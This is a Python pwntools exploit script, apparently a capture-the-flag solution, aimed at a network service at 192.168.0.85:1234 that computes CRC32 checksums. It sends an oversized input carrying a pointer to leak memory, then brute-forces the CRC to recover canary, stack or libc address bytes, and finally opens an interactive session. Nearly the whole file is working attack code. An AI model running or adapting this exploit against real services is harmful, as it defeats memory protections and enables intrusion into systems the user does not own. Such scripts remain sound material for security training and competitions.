from pwn import *

s = remote('192.168.0.85',1234)
CRC32Table = []
for i in range(256):
    k = i << 24
    for j in range(8):
        bit = k >> 31
        k <<= 1
        if bit:
            k ^= 0x4C11DB7
        k &= 0xffffffff
    CRC32Table.append(k)

# print CRC32Table
import ctypes
import sys
import itertools

def reverse_crc(crc, mode):
   tmp = ctypes.c_uint32()
   tmp.value = -1
   # crc = ~crc & 0xffffffff
   # crc = int(bin(crc).replace('-', '').replace('0b', '')[::-1], 2)

   for i in itertools.product(''.join(chr(i) for i in range(0x100)), repeat=3):
      tmp.value = -1
      if mode == "canary":
         plain = '\x00' + i[0] + i[1] + i[2]
      elif mode == "stack":
         plain = i[0] + i[1] + i[2] + '\xff'
      elif mode == "libc":
         plain = i[0] + i[1] + i[2] + '\xf7'
      elif mode == "debug":
         plain = i[0] + i[1] + i[2] + 'A'


      for j in plain:
        x = int(bin(ord(j))[2:].rjust(8,"0")[::-1],2)
        # x = 0x82
        # tmp = ((tmp << 8) ^ CRC32Table[((tmp >> 18) ^ x) & 0xff]) & 0xffffffff
        tmp.value = CRC32Table[((tmp.value >> 0x18) ^ x) & 0xff] ^ (tmp.value << 8)

      if tmp.value == crc:
         # print hex(tmp)
         # print hex(tmp.value)
         print plain.encode("hex")
         break

def calc(size,dat):
  s.recvuntil('Choice:')
  s.send('1\n')
  s.recvuntil('What is the length of your data: ')
  s.send(str(size)+'\n')
  s.recvuntil('Please send me %d bytes to process: '%size)
  s.send(dat+'\n')
raw_input()
calc(0x4,'A'*0x64+p32(0x08049FE4))
r = int(s.recvuntil('-')[-12:-1],16)
fuck = ctypes.c_uint32()
fuck.value = r
fuck.value = ~fuck.value
fuck.value = int(bin(fuck.value)[2:].rjust(32,"0")[::-1],2)
libc = reverse_crc(fuck.value, "libc")
#log.info('LIBC : 0x%x'%libc)
print libc
s.interactive()
